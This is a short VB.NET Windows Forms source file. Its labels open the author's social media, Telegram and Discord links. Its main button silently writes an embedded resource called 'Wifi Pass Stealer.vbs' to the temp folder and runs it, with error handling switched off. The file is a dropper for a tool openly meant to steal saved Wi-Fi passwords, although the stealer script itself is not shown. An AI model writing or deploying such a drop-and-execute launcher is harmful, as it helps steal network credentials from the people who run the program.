Public Class Form1
    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click
        Process.Start("https://www.facebook.com/developers.syriaa")
        Process.Start("https://www.facebook.com/MONSTERMCSY")
    End Sub
    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        Process.Start("https://www.youtube.com/channel/UCTgM5jrZ7AKcsdIsa8NSfxA")
    End Sub
    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
        Process.Start("https://t.me/MONSTERMCSY")
    End Sub
    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click
        Process.Start("https://discord.gg/BnB9wxFKMb")
    End Sub
    Private Sub EButton1_Click(sender As Object, e As EventArgs) Handles EButton1.Click
        On Error Resume Next
        Dim dir As String = My.Computer.FileSystem.SpecialDirectories.Temp
        Dim filename As String = dir + "Wifi Pass Stealer.vbs"
        IO.File.WriteAllBytes(filename, My.Resources.Wifi_Pass_Stealer)
        Process.Start(filename)
    End Sub
    Private Sub EButton2_Click(sender As Object, e As EventArgs) Handles EButton2.Click
        End
    End Sub
End Class
